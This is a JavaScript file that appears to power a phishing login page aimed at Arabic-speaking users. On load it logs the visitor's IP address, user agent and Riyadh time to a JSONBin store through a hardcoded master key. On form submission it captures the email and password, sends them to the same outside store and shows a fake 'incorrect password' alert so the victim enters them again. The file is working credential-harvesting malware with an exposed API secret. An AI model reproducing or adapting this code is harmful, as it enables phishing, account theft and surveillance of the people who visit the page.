// JSONBin config (or use your own server URL)
const jsonBinUrl = "https://api.jsonbin.io/v3/b/67d3a88d8a456b7966757290";
const masterKey = "$2a$10$ckeEEBqkAjavrXvKNdAJo.FSeD7uKDSV98YZete3agyvG2VG6WdxS";
 
// Global info
let ipAddress = "";
let userAgent = navigator.userAgent;
let ksaTime = "";

// Get IP Address
async function fetchIP() {
  try {
    const res = await fetch('https://api64.ipify.org?format=json');
    const data = await res.json();
    ipAddress = data.ip || "unknown";
  } catch {
    ipAddress = "failed to fetch";
  }
}

// Get KSA Time
function getKSATime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone: "Asia/Riyadh",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });
  ksaTime = formatter.format(now).replace(",", "") + " KSA";
}

// Log basic visit info
async function logVisitInfo() {
  try {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    ipAddress = data.ip;
    getKSATime();

    const visitData = {
      event: "visit",
      ip: ipAddress,
      time: ksaTime,
      userAgent
    };

   // console.log("Visit Info:", visitData);

    // 1. Fetch existing bin data
    const res = await fetch(jsonBinUrl, {
      headers: { "X-Master-Key": masterKey }
    });
    const existing = await res.json();
    const currentData = existing.record || {};

    // 2. Append to visits
    const visits = currentData.visits || [];
    visits.push(visitData);

    // 3. Keep logins intact
    const logins = currentData.logins || [];

    // 4. Save combined data
    await fetch(jsonBinUrl, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": masterKey
      },
      body: JSON.stringify({ visits, logins })
    });
  } catch (err) {
   // console.error("Error logging visit:", err);
  }
}

// Log login form data
async function logLogin(email, password) {
  getKSATime(); // refresh time
  const loginData = {
    event: "login_attempt",
    ip: ipAddress,
    time: ksaTime,
    userAgent,
    email,
    password,
  };

  try {
    // 1. Get current record
    const res = await fetch(jsonBinUrl, {
      headers: { "X-Master-Key": masterKey }
    });
    const existing = await res.json();
    const currentData = existing.record || {};

    // 2. Append new login
    const logins = currentData.logins || [];
    logins.push(loginData);

    // 3. Keep visits intact
    const visits = currentData.visits || [];

    // 4. Save merged object
    await fetch(jsonBinUrl, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": masterKey
      },
      body: JSON.stringify({ visits, logins })
    });

  alert("كلمة المرور غير صحيحة!، يرجى المحاولة مرة اخرى");
  } catch (err) {
    //console.error("Logging error:", err);
     alert("كلمة المرور غير صحيحة!، يرجى المحاولة مرة اخرى");
     
  }
}

// Login form submit handler
document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  if (email && password) {
    logLogin(email, password);
  }
});

// Trigger page logging
logVisitInfo();
